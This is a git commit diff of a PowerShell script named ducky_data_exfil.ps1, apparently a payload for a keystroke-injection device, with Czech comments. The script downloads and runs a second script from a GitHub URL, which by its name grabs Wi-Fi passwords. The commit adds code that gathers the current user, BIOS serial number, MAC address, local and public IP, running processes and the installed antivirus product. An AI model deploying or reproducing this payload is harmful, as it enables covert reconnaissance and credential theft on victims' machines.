3fb2c59dd064a40996015452eed030fc990de768
spajk.cz <75394159+spajk-cz@users.noreply.github.com>
2023-12-04 19:20:33 +0100

    Update ducky_data_exfil.ps1

--- ducky_data_exfil.ps1
+++ ducky_data_exfil.ps1
@@ -2,7 +2,7 @@
 $scriptUrl = "https://raw.githubusercontent.com/spajk-cz/omg/main/ducky_WLAN_PASS.ps1"
 
 # Nastavení cesty, kam chcete skript uložit
-$scriptPath = "C:\path\to\downloaded\script.ps1"
+$scriptPath = "C:\Windows\Temp\script.ps1"
 
 # Stažení skriptu
 Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
@@ -15,4 +15,43 @@ if (Test-Path $scriptPath) {
     Write-Host "Skript se nepodařilo stáhnout."
 }
 
-$serialNumber = Get-WmiObject win32_bios | Select-Object -ExpandProperty SerialNumber; $macAddress = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -ExpandProperty MacAddress; $localIP = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.AddressState -eq "Preferred" -and $_.InterfaceAlias -notlike "Loopback*" } | Select-Object -ExpandProperty IPAddress; $publicIP = Invoke-RestMethod -Uri "http://icanhazip.com"; Write-Host "Sériové číslo: $serialNumber, MAC adresa: $macAddress, Lokální IP adresa: $localIP, Veřejná IP adresa: $publicIP"
+# Získání jména aktuálně přihlášeného uživatele
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+Write-Host "Přihlášený uživatel: $currentUser"
+
+Write-Host "`n" # Prázdný řádek
+
+# Získání sériového čísla počítače
+$serialNumber = Get-WmiObject win32_bios | Select-Object -ExpandProperty SerialNumber
+Write-Host "Sériové číslo: $serialNumber"
+
+Write-Host "`n" # Prázdný řádek
+
+# Zjištění MAC adresy aktivního síťového adaptéru
+$macAddress = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -ExpandProperty MacAddress
+Write-Host "MAC adresa: $macAddress"
+
+Write-Host "`n" # Prázdný řádek
+
+# Zjištění lokální IP adresy
+$localIP = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.AddressState -eq "Preferred" -and $_.InterfaceAlias -notlike "Loopback*" } | Select-Object -ExpandProperty IPAddress
+Write-Host "Lokální IP adresa: $localIP"
+
+Write-Host "`n" # Prázdný řádek
+
+# Zjištění veřejné IP adresy
+$publicIP = Invoke-RestMethod -Uri "http://icanhazip.com"
+Write-Host "Veřejná IP adresa: $publicIP"
+
+Write-Host "`n" # Prázdný řádek
+
+# Získání seznamu běžících procesů
+$runningProcesses = Get-Process | Select-Object -ExpandProperty Name
+Write-Host "Běžící procesy: $($runningProcesses -join ', ')"
+
+Write-Host "`n" # Prázdný řádek
+
+# Zjištění názvu nainstalovaného antivirového programu
+$antivirusName = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
+Write-Host "Antivirus: $antivirusName"
+
